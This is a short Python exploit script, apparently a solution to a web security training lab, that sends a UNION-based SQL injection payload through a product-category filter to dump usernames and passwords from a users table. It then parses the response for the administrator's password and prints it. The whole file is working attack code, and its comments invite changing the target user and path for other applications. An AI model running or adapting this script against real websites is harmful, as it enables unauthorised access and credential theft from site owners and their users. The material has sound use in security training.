import sys;
import requests;
import urllib3;
from bs4 import BeautifulSoup;
import re;

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def exploit_sqli_users_table(url):
    username = 'administrator' #change according to the target person
    path = '/filter?category=Pets' #change according to the target application
    sql_payload = "' union select null, (username || '*' || password) from users--"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies) 
    res = r.text
    if "administrator" in res:
        print("[+] Found the administrator's password...")
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_password = soup.find(string=re.compile('.*administrator.*')).split("*")[1]
        print("[+] Administrator's password is: '%s'." % admin_password)
        return True
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s https://www.example.com" % sys.argv[0])
        sys.exit(-1) 
    print("[+] Cross Checking the list of usernames and passwords...")
     
    if not exploit_sqli_users_table(url):
        print("[-] Did not find an administrator's password from the users table")
